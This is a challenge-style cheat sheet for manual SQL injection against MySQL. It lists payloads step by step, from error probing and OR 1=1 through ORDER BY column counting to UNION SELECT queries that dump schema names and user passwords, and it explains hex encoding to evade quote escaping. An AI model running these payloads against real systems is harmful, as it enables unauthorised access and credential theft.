Medium Manual SQL Injection Payload Example - mysql
@ challenge : construct string (sql payload) without using quotes (').
@ challenge : find some hidden tables and data on the database.

-- Tests for SQL injection by injecting a single quote to provoke error messages.
1' 

-- Attempts a boolean-based SQL injection by injecting a condition that always evaluates to true, showing all user on the current table.
1 OR 1=1#

-- Searching for columns numbers, Will produce error at 4, meaning query targets three columns
1 order by 1 # -- Order by the first column
1 order by 2 # -- Order by the second column
1 order by 3 # -- Order by the third column
1 order by 4 # -- Error indicates the query targets at least three columns

OR

1 order by 1,2,3# -- Order by the 1,2,3 column. No error
1 order by 1,2,3,4# -- Error indicates the query targets at least three columns

-- Tries a union-based SQL injection to extract database and column names.

-- Retrieve current database and its version
1 UNION SELECT database(), version(), NULL #

-- Retrieve table names from the specified database (0x6c656b6972 = lekir)
1 UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=0x6c656b6972#

-- Retrieve column names from the specified table (0x75736572 = user) using database (0x6c656b6972 = lekir)
1 UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name=0x75736572 AND table_schema=0x6c656b6972#

-- Retrieve user-related information from the user table
1 UNION SELECT user_id, user_name, user_password FROM lekir.user #


@ text to hex
@ 0x6c656b6972 = lekir (database name)
@ 0x75736572 = user (table name)
@ Why we using text to hex due to mysqli_real_escape_string() function, we try to avoid using ' .


-- Notes
MySQL Functions

CURRENT_USER()	Returns the user name and host name for the MySQL account that the server used to authenticate the current client
DATABASE()		Returns the name of the current database
SESSION_USER()	Returns the current MySQL user name and host name
SYSTEM_USER()	Returns the current MySQL user name and host name
USER()			Returns the current MySQL user name and host name
VERSION()		Returns the current version of the MySQL database



Why we using 0x notations, there is no need to use ' thus bypasing sql_real_escape_strings
select hex("lekir"); -> result will be 6c656b6972
select unhex("6c656b6972"); -> result will be lekir
select x'6c656b6972'; -> result will be lekir
select 0x6c656b6972l -> result will be lekir
